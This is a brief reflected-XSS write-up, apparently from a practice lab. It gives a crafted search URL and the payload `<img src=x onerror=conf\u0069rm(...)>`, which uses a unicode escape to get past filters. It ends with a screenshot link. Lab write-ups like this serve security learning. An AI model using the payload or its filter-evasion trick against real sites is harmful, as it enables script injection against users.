...
1. Open:
https://kzlabs.com/punishment/25.php?search=%3CiMg%20src=x%20onerror=conf\u0069rm(%22RAJ%22)%3E

2. Observe execution of payload.

## Payload Used
`<img src=x onerror=conf\u0069rm("RAJ")>`

## Proof of Concept

## Screenshot — Vulnerable application reflecting injected payload
<img width="1920" height="789" alt="image" src="https://github.com/user-attachments/assets/7cdeb9d9-5fc8-4abd-b845-43dd70bb433a" />
